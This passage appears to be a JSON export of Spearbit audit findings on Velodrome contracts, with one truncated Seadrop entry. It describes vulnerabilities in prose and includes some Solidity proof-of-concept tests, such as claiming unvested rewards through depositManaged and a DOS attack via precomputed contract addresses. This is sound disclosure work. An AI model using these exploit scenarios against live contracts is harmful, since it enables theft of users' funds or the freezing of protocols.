        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The constant WEEK is used as the duration of an epoch that resets every Thursday, after 4 years (4 * 365.25 days) the day of the week will eventually shift, not following the Thursday cadence.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Ownership change will break certain yield farming automations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Due to the check, any transfer done in the same block as the call to depositManaged will revert. While a sidestep for the mechanic for malicious users was shown, the check will prevent a common use case in Yield Farming: Zapping. Because of the check, an end user will not be able to zap from their VELO to VE to the Managed Position, which may create a sub-par experience for end users. This should also create worse UX for Yield Farming Projects as they will have to separate the transfer from the deposit which will cost them more gas and may make their product less capital efficient",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Quantitative analysis of Minter logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "It will take 110 iterations to go from 15 MLN to the Tail Emission Threshold Minter.sol#L32-L37 /// @notice When emissions fall below this amount, begin tail emissions uint256 public constant TAIL_START = 5_000_000 * 1e18; /// @notice Tail emissions rate in basis points uint256 public tailEmissionRate = 30; /// @notice Starting weekly emission of 15M VELO (VELO has 18 decimals) uint256 public weekly = 15_000_000 * 1e18; ## Python allows decimal Math, wlog, just take mantissa INITIAL = 15 * 10 ** 6 TAIL = 5 * 10 ** 6 MULTIPLIER_BPS = 99_00 MAX_BPS = 10_000 value = INITIAL i = 0 min_emitted = 0 while (value > TAIL): i+= 1 min_emitted += value value = value * MULTIPLIER_BPS / MAX_BPS i 110 value 4965496.324815211 min_emitted 1003450367.5184793 ## If nobody ever bridged, this would be emissions at tail min_emitted * 30 / 10_000 3010351.1025554384 Tail emissions are most likely going to be a discrete step down in emissions >>> min_emitted 1003450367.5184793 V1_CIRC = 150 * 10 ** 6 ranges = range(V1_CIRC // 10, V1_CIRC, V1_CIRC // 10) for val in ranges: print((min_emitted + val) * 30 / 10_000) 3055351.1025554384 3100351.1025554384 3145351.1025554384 3190351.1025554384 3235351.1025554384 3280351.1025554384 3325351.1025554384 3370351.1025554384 3415351.1025554384 The last value before the tail will be most likely around 1 Million fewer tokens minted per period. Maximum Mintable Value is slightly above Tail, with Absolute Max being way above Tail 57 ## Max Supply >>> 1000 * 10 ** 6 1000000000 >>> min_emitted = 1003450367.5184793 >>> max_circ = 1000 * 10 ** 6 + min_emitted >>> max_mint = max_circ * 30 / 10_000 ## If we assume min_emitted + 1 Billion Velo V1 Sinked >>> max_mint 6010351.102555438 ## If we assume nudge to 100 BPS >>> abs_max_mint = max_circ * 100 / 10_000 >>> abs_max_mint 20034503.675184794",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Optimism's block production may change in the future",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "block number, because of OP potentially changing block frequency in the future, given Bedrocks update to block.timestamp, it may be desirable to refactor back to the OZ implementation. And VeloGorvernor assumes 2 blocks every second. In OP's docs says block.number is not a reliable timing reference: community.optimism.io/docs/developers/build/differences/#block- numbers-and-timestamps It's also dangerous to use block.number at the time cause it will probably mean a different thing in pre- and post- bedrock upgrades.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unnecessary check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "These checks are unnecessary because it already checks if targets and calldata lengths are equal to 1.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Event is missing indexed fields",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Index event fields make the field more quickly accessible to off-chain tools that parse events. How- ever, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing checks for address(0) when assigning values to address state variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Lack of zero-address validation on address parameters may lead to transaction reverts, waste gas, require resubmission of transactions and may even force contract redeployments in certain cases within the proto- col.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational FactoryRegistry.sol#L26-L28, RewardsDistributor.sol#L308,"
        ]
    },
    {
        "title": "Incorrect comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "There are a few mistakes in the comments that can be corrected in the codebase.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Discrepancies between specification and implementation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Instance 1 - Zapping The specification mentioned that it supports zapping into a pool from any token. Following is the extract  Swapping and lp depositing/withdrawing of fee-on-transfer tokens.  Zapping in and out of a pool from any token (i.e. A->(B,C) or (B,C) -> A). A can be the same as B or C.  Zapping and staking into a pool from any token. 60 However, the zapIn and zapOut functions utilize the internal _swap function that does not support fee-on-transfer tokens.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Early exit for withdrawManaged function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "VotingEscrow.withdrawManaged function.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "DOS attack at future facilitator contract and stop SinkManager.convertVe",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "As noted in \"DOS attack by delegating tokens at MAX_DELEGATES = 1024\", the old votingEscrow has a gas concern, i.e., the gas cost of transfer/ burn will increase when an address holds multiple NFT tokens. The concern becomes more serious when the protocol is deployed on Optimism, where the gas limit is smaller than other L2 chains. If an address is being attacked and holds max NFT tokens (1024), the user can not withdraw funds due to the gas limit. To mitigate the potential DOS attack where the attack DOS the v1's votingEscrow and stop sinkManager from re- ceiving tokens, the sinkManager utilize a facilitator contract. When the sinkManager needs to receive the votingE- scrow NFT, it creates a new contract specifically for this purpose. Since the contract is newly created, it does not contain any tokens, making it more gas-efficient to receive the token through the facilitator contract. However, the attacker can DOS attack the contract by sending NFT tokens to a future facilitator. salted-contract-creations-create2 When creating a contract, the address of the contract is computed from the address of the creating contract and a counter that is increased with each contract creation. The exploit scenario would be: At the time the sinkManager is deployed and zero facilitator is created. The attacker can calculate the address of all future facilitators by computing sha3(rlp.encode([normalize_address(sender), nonce]))[12:] The attacker can compute the 10-th facilitator's address and sends 1024 NFT tokens to the ad- dress. The sinkManager will function normally nine times. Though, when the 10th user wants to convert the token, the sinkManager deployed the 10th facilitator address. Since the 10th facilitator already has 1024 NFT positions, it can not receive any tokens. The transaction will revert and the sinkManager will be stuck in the current state.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "RewardDistributor caching totalSupply leading to incorrect reward calculation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "RewardDistributor distributes newly minted VELO tokens to users who locks the tokens in VotingEscrow. Since the calculation of past supply is costly, the rewardDistributor cache the supply value in uint256[1000000000000000] public veSupply. The RewardDistributor._checkpointTotalSupply function would iterate from the last updated time util the latest epoch time, fetches totalSupply from votingEscrow, and store it. Assume the following scenario when a transaction is executed at the beginning of an epoch. 1. The totalSupply is X. 2. The user calls checkpointTotalSupply. The rewardDistributor save the totalSupply = X. 3. The user creates a lock with 2X the amount of tokens. The user has balance = 2X and the totalSupply becomes 3X. 4. Fast forward to when the reward is distributed. The user claims the tokens, reward is calculated by total reward * balance / supply and user gets 2x of the total rewards.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Lack of slippage control during compounding",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "When swapping the reward tokens to VELO tokens during compounding, the slippage control is disabled by configuring the amountOutMin to zero. This can potentially expose the swap/trade to sandwich attacks and MEV (Miner Extractable Value) attacks, resulting in a suboptimal amount of VELO tokens received from the swap/trade. router.swapExactTokensForTokens( balance, 0, // amountOutMin routes, address(this), block.timestamp );",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ALLOWED_CALLER can steal all rewards from AutoCompounder using a fake factory in the route.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "AutoCompounder allows address with ALLOWED_CALLER role to trigger swapTokenToVELOAndCompound. The function sells the specified tokens to VELO. Since the Velo router supports multiple factories. An attacker can deploy a fake factory with a backdoor. By routing the swaps through the backdoor factory the attacker can steal all reward tokens in the AutoCompounder contract.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "depositManaged can be used by locks to receive unvested VELO rebase rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Velo offer rebase emissions to all Lockers. These are meant to be depositFor into an existing lock, and directly transferred if the lock just expired. The check is the following: if (_timestamp > _locked.end && !_locked.isPermanent) { By calling depositManaged we can get the check to pass for a Lock that is not expired, allowing us to receive Unvested Velo (we could sell unfairly for example). Due to how depositManaged and withdrawManaged work, the attacker would be able to perform this every other week (1 week cooldown, 1 week execution). Because of how the fact that managedRewards are delayed by a week the attacker will not lose any noticeable amount of rewards, meaning that most users would rationally opt-into performing this operation to gain an unfair advantage, or to sell their rewards each week while other Lockers are unable or unwilling to perform this operation. The following POC will show an increase in VELO balance for the tokenId2 owner in spite of the fact that the lock is not expired Logs: Epoch 1 Token Locked after Token2 Locked after User Bal after 56039811453980167852 -1000000000000000000000000 // Negative because we have `depositManaged` 56039811453980167852 // We received the token directly, unvested function testInstantClaimViaManaged() public { // Proof that if we depositManaged, we can get our rebase rewards instantly // Instead of having to vest them via the lock skipToNextEpoch(1 days); minter.updatePeriod(); console2.log(\"Epoch 1\"); VELO.approve(address(escrow), TOKEN_1M * 2); uint256 tokenId = escrow.createLock(TOKEN_1M, MAXTIME); uint256 tokenId2 = escrow.createLock(TOKEN_1M, MAXTIME); uint256 mTokenId = escrow.createManagedLockFor(address(this)); skipToNextEpoch(1 hours + 1); minter.updatePeriod(); 65 skipToNextEpoch(1 hours + 1); minter.updatePeriod(); // Now we claim for 1, showing that they incease locked int128 initialToken1 = escrow.locked(tokenId).amount; distributor.claim(tokenId); // Claimed from previous epoch console2.log(\"Token Locked after \", escrow.locked(tokenId).amount - initialToken1); // For 2, we deposit managed, then claim, showing we get tokens unlocked uint256 initialBal = VELO.balanceOf(address(this)); int128 initialToken2 = escrow.locked(tokenId2).amount; voter.depositManaged(tokenId2, mTokenId); distributor.claim(tokenId2); // Claimed from previous epoch console2.log(\"Token2 Locked after \", escrow.locked(tokenId2).amount - initialToken2); console2.log(\"User Bal after \", VELO.balanceOf(address(this)) - initialBal); }",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Unnecessary slippage loss due to AutoCompounder selling VELO",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "AutoCompounder allows every address to help claim the rewards and compound to the locked VELO position. The AutoCompounder will sell _tokensToSwap into VELO. By setting VELO as _tokensToSwap, the AutoCom- pounder would do unnecessary swaps that lead to unnecessary slippage loss.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "epochVoteStart function calls the wrong library method",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The epochVoteStart function calls the VelodromeTimeLibrary.epochStart function instead of the VelodromeTimeLibrary.epochVoteStart function. Thus, the Voter.epochVoteStart function returns a voting start time without factoring in the one-hour distribution window, which might cause issues for users and developers relying on this information.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Managed NFT can vote more than once per epoch under certain circumstances",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The owner of the managed NFT could break the invariant that an NFT can only vote once per epoch Assume Bob owns the following two (2) managed NFTs:  Managed veNFT (called mNFTa) with one (1) locked NFT (called lNFTa)  Managed veNFT (called mNFTb) with one (1) locked NFT (called lNFTb)  The balance of lNFTa and lNFTb is the same Bob voted on poolx with mNFTa and mNFTb on the first hour of the epoch At the last two hours of the voting windows of the current epoch, Bob changed his mind and decided to vote on the pooly . Under normal circumstances, the onlyNewEpoch modifier will prevent mNFTa and mNFTb from triggering the Voter.vote function because these two veNFTs have already voted in the current epoch and their lastVoted is set to a timestamp within the current epoch. However, it is possible for Bob to bypass this control. Bob could call Voter.withdrawManaged function to withdraw lNFTa and lNFTb from mNFTa and mNFTb respectively. Since the weight becomes zero, the lastVoted for both mNFTa and mNFTb will be cleared. As a result, they will be allowed to re-vote in the current epoch. Bob will call Voter.depositManaged to deposit lNFTb into mNFTa and lNFTa into mNFTb respectively to increase the weight of the managed NFTs. Bob then calls Voter.vote with mNFTa and mNFTb to vote on pooly . Since the lastVoted is empty (cleared earlier), the onlyNewEpoch modifier will not revert the transaction. Understood that the team that without clearing the lastVoted, it would lead to another potential issue where a new managed NFT could potentially be made useless temporarily for an epoch. Given the managed NFT grant significant power to the owner, the team intended to restrict access to the managed NFTs and manage abuse by utilizing the emergency council/governor to deactivate non-compliant managed NFTs, thus mitigating the risks of this issue.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Invalid route is returned if token does not have a trading pool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Assume that someone called the getOptimalTokenToVeloRoute function with a token called T that does not have a trading pool within Velodrome. While looping through all the ten (two) routes pre-defined in the constructor at Line 94 below, since the trading pool with T does not exist, it will keep skipping to the next route until the loop ends. As such, the index remains uninitialized at the end, meaning it holds the default value of zero. In Lines 110 to 112, it will conclude that the optimal route is as follows: routes[0] = routesTokenToVelo[index][0] = routesTokenToVelo[0][0] = address(0) <> USDC routes[1] = routesTokenToVelo[index][1] = routesTokenToVelo[0][1] = USDC <> VELO routes[0].from = token = T routes = T <> USDC <> VELO As a result, the getOptimalTokenToVeloRoute function returns an invalid route. function getOptimalTokenToVeloRoute( address token, uint256 amountIn ) external view returns (IRouter.Route[] memory) { // Get best route from multi-route paths uint256 index; uint256 optimalAmountOut; IRouter.Route[] memory routes = new IRouter.Route[](2); uint256[] memory amountsOut; // loop through multi-route paths for (uint256 i = 0; i < 10; i++) { routes[0] = routesTokenToVelo[i][0]; // Go to next route if a trading pool does not exist if (IPoolFactory(routes[0].factory).getPair(token, routes[0].to, routes[0].stable) == address(0)) continue; ,! routes[1] = routesTokenToVelo[i][1]; // Set the from token as storage does not have an address set routes[0].from = token; amountsOut = router.getAmountsOut(amountIn, routes); // amountOut is in the third index - 0 is amountIn and 1 is the first route output uint256 amountOut = amountsOut[2]; if (amountOut > optimalAmountOut) { // store the index and amount of the optimal amount out optimalAmountOut = amountOut; index = i; } } // use the optimal route determined from the loop routes[0] = routesTokenToVelo[index][0]; routes[1] = routesTokenToVelo[index][1]; routes[0].from = token; // Get amountOut from a direct route to VELO IRouter.Route[] memory route = new IRouter.Route[](1); 68 route[0] = IRouter.Route(token, velo, false, factory); amountsOut = router.getAmountsOut(amountIn, route); // compare output and return the best result return amountsOut[1] > optimalAmountOut ? route : routes; }",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "SafeApprove is not used in AutoCompounder",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "safeApprove is not used in AutoCompounder. Tokens that do not follow standard ERC20 will be locked in the contract.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "balanceOfNFT can be made to return non-zero value via split and merge",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Ownership Change Sidestep via Split. Splitting allows to change the ID, and have it work. This allows to sidestep this check in VotingEscrow.sol#L1052-L1055 Meaning you can always have a non-zero balance although it requires performing some work. This could be used by integrators as a way to accurately track their own voting power.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "delegateBySig can use malleable signatures",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because the function delegateBySig uses ecrecover and doesn't check for the value of the sig- nature, other signatures, that have higher numerical values, which map to the same signature, could be used. Because the code uses nonces only one signature could be used per nonce.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Slightly Reduced Voting Power due to Rounding Error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because of rounding errors, a fully locked NFT will incur a slight loss of Vote Weight (around 27 BPS). [PASS] testCompareYieldOne() (gas: 4245851) Logs: distributor.claimable(tokenId) 0 locked.amount 1000000000000000000000000 block.timsestamp 1814399 block.timsestamp 1900800 Epoch 2 distributor.claimable(tokenId) 0 locked.amount 1000000000000000000000000 escrow.userPointHistory(tokenId, 1) 0 escrow.userPointHistory(tokenId, 1) 1814399 escrow.userPointHistory(tokenId, 1) BIAS 997260281900050656907546 escrow.userPointHistory(tokenId, tokenId2) 1814399 escrow.userPointHistory(tokenId, tokenId2) BIAS 997260281900050656907546 userPoint.ts 1814399 getCursorTs(tokenId) 1814400 userPoint.ts 1814399 epochStart(tokenId) 1814400 70 userPoint.ts 1814399 ve.balanceOfNFTAt(tokenId, getCursorTs(tokenId) - 1) 997260281900050656907546 function getCursorTs(uint256 tokenId) internal returns(uint256) { IVotingEscrow.UserPoint memory userPoint = escrow.userPointHistory(tokenId, 1); console2.log(\"userPoint.ts\", userPoint.ts); uint256 weekCursor = ((userPoint.ts + WEEK - 1) / WEEK) * WEEK; uint256 weekCursorStart = weekCursor; return weekCursorStart; } function epochStart(uint256 timestamp) internal pure returns (uint256) { unchecked { return timestamp - (timestamp % WEEK); } } function testCompareYieldOne() public { skipToNextEpoch(1 days); // Epoch 1 skipToNextEpoch(-1); // last second VELO.approve(address(escrow), TOKEN_1M * 2); uint256 tokenId = escrow.createLock(TOKEN_1M, MAXTIME); uint256 tokenId2 = escrow.createLock(TOKEN_1M, 4 * 365 * 86400); uint256 mTokenId = escrow.createManagedLockFor(address(this)); console2.log(\"distributor.claimable(tokenId)\", distributor.claimable(tokenId)); console2.log(\"locked.amount\", escrow.locked(tokenId).amount); console2.log(\"block.timsestamp\", block.timestamp); minter.updatePeriod(); // Update for 1 skipToNextEpoch(1 days); // Go next epoch minter.updatePeriod(); // and update 2 console2.log(\"block.timsestamp\", block.timestamp); console2.log(\"Epoch 2\"); //@audit here we have claimable for tokenId and mTokenId IVotingEscrow.LockedBalance memory locked = escrow.locked(tokenId); console2.log(\"distributor.claimable(tokenId)\", distributor.claimable(tokenId)); console2.log(\"locked.amount\", escrow.locked(tokenId).amount); console2.log(\"escrow.userPointHistory(tokenId, 1)\", escrow.userPointHistory(tokenId, 0).ts); console2.log(\"escrow.userPointHistory(tokenId, 1)\", escrow.userPointHistory(tokenId, 1).ts); console2.log(\"escrow.userPointHistory(tokenId, 1) BIAS\", escrow.userPointHistory(tokenId, 1).bias); ,! console2.log(\"escrow.userPointHistory(tokenId, tokenId2)\", escrow.userPointHistory(tokenId2, 1).ts); ,! console2.log(\"escrow.userPointHistory(tokenId, tokenId2) BIAS\", ,! escrow.userPointHistory(tokenId2, 1).bias); console2.log(\"getCursorTs(tokenId)\", getCursorTs(tokenId)); console2.log(\"epochStart(tokenId)\", epochStart(getCursorTs(tokenId))); console2.log(\"ve.balanceOfNFTAt(tokenId, getCursorTs(tokenId) - 1)\", ,! escrow.balanceOfNFTAt(tokenId, getCursorTs(tokenId) - 1)); } 71",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Some setters cannot be changed by governance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "It was found that some setters, related to emergencyCouncil and Team can only be called by the current role owner. It may be best to allow Governance to also be able to call such setters as a way to allow it to override or replace a misaligned team. The Emergency Council can kill gauges, preventing those gauges from receiving emissions. Voter.sol#L151-L155. function setEmergencyCouncil(address _council) public { if (_msgSender() != emergencyCouncil) revert NotEmergencyCouncil(); if (_council == address(0)) revert ZeroAddress(); emergencyCouncil = _council; } The team can simply change the ArtProxy which is a cosmetic aspect of Voting Escrow. VotingEscrow.sol#L241-L245 function setTeam(address _team) external { if (_msgSender() != team) revert NotTeam(); if (_team == address(0)) revert ZeroAddress(); team = _team; }",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Rebase Rewards distribution is shifted by one week, allowing new depositors to receive unfair yield initially (which they'll give back after they withdraw)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The finding is not particularly dangerous but it is notable that because Reward will allow claiming of rewards on the following Epoch, and because Rebase rewards from the Distributor Distributor.claim are distributed based on the balance at the last second of the previous epoch, a desynchronization in how rewards are distributed will happen. This will end up being fair in the long run however here's an illustrative scenario:  Locker A has a small lock, they wish to increase the amount they have locked.  They increase the amount but miss out on rebase rewards (because they are based on their balance at the last second of the previous epoch).  They decide to depositManaged which will distribute rewards based on their current balance, meaning they will \"steal\" a marginal part of the yield. 72  The next epoch, their weight will help increase the yield for everyone, and because Rebasing Rewards are distributed with a week of delay, they will eventually miss out on a similar proportion of yield they \"stole\".",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "AutoCompounder can be created without admin",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Creating an AutoCompounder contract without an _admin by passing address(0) through AutoCom- pounderFactory is possible. This will break certain functionalities in the AutoCompounder.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "claim and claimMany functions will revert when called in end lock time",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "block.timestamp >= oldLocked.end. If _timestamp == _locked.end, then depositFor() will be called but this will revert as",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Malicious Pool Factory can be used to prevent new pools from being voted on as well as brick voting locks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because gauges[_pool] can only be set once in the voter, governance has the ability to introduce a malicious factory, that will revert on command as a way to prevent normal protocol functionality as well as prevent depositors that voted on these from ever being able to unlock their NFTs  ve.withdraw requires not having voted.  To remove voting reset is called, which in turn calls IReward(gaugeToFees[gauges[_pool]])._with- draw(uint256(_votes), _tokenId);.  If a malicious gaugeToFees contract is deployed, the tokenId won't be able to ever set voted to false preventing the ability from ever withdrawing. 73",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Pool will stop working if a pausable / blockable token is blocked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Some tokens are pausable or implement a block list (e.g. USDC), if such a token is part of a Pool, and the Pool is blocked, the Pool will stop working. It's important to notice that the LP token, which wraps a deposit will still be transferable and the composability with Gauges and Reward Contracts will not be broken even when the pool is unable to function.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use ClonesWithImmutableArgs in AutoCompounderFactory saves gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The AutoCompounderFactory can utilize ClonesWithImmutableArgs to deploy new AutoCompounder contracts. This would save a lot of gas compared to the current implementation.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Convert hardcoded route to internal function in CompoundOptimizer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "All of the hardcoded route setups can be converted to an internal function with hardcoded values.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Early return in supplyAt save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "To save gas, you can return in case of _epoch is equal to zero can be made before cache _point.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Approved User could Split NFTs and be unable to continue operating",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "An approved user can be approved via approve, the storage value set is idToApprovals[_tokenId] = _approved; Splitting will create two new NFTs that will be sent to the owner. This means that an approved user would be able to split the NFTs on behalf of the owner, however, in doing so they would lose ownership of the NFTs, being unable to continue using them during the TX",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add sweep function to CompoundOptimizer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Some tokens may be completely illiquid, may not be worth auto-compounding so it would be best to also allow a way to sweep tokens out to the owner for some tokens. Examples:  Airdrops / Extra rewards.  Very new tokens that the owner wants to farm instead of dump.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Allow Manual Suggestion of Pair in AutoCompounder",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Allow manual suggestion of token pairs such as USDC, USDT, LUSD, and wBTC. It may be best to pass a list of pairs as parameters to check for additional tokens. Ultimately, if a suggested pair offers a better price, there's no reason not to allow it. The caller should be able to pass a suggested optimal route, which can then be compared against other routes. Use whichever route is best. If the user's suggested route is the best one, use theirs and ensure that the swap goes through.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Check if owner exists in split function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "In case the NFT does not exist, the _ownerOf(_from) function returns the zero address. This check is satisfied if canSplit has been toggled. However, this does not lead to any issues because the _- isApprovedOrOwner() check will revert as intended, and there is no amount in the lock. It may be a good idea to update the _ownerOf() function to revert if there is no owner for the NFT.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Velo and Veto Governor do not use MetaTX Context",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "These two contracts use Context instead of ERC2771Context.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "SinkManager is depositing to Gauge without using the TokenId",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "gauge.deposit allows to specify a tokenId, but the field is unused",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "ERC721SeaDrop's modifier onlyOwnerOrAdministrator would allow either the owner or the admin to override the other person's config parameters.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The following 4 external functions in ERC721SeaDrop have the onlyOwnerOrAdministrator modifier which allows either one to override the other person's work.  updateAllowedSeaDrop  updateAllowList  updateDropURI  updateSigner That means there should be some sort of off-chain trust established between these 2 entities. Otherwise, there are possible vectors of attack. Here is an example of how the owner can override AllowListData.merkleRoot and the other fields within AllowListData to generate proofs for any allowed SeaDrop's mintAllowList endpoint that would have MintParams.feeBps equal to 0: 1. The admin calls updateAllowList to set the Merkle root for this contract and emit ERC721SeaDrop.updateAllowList: SeaDrop.sol#L827 the other parameters as logs. for an allowed SeaDrop implementation The SeaDrop endpoint being called by 2. The owner calls updateAllowList but this time with new parameters, specifically a new Merkle root that is computed from leaves that have MintParams.feeBps == 0. 3. Users/minters use the generated proof corresponding to the latest allow list update and pass their mintParams.feeBps as 0. And thus avoiding the protocol fee deduction for the creatorPaymentAddress 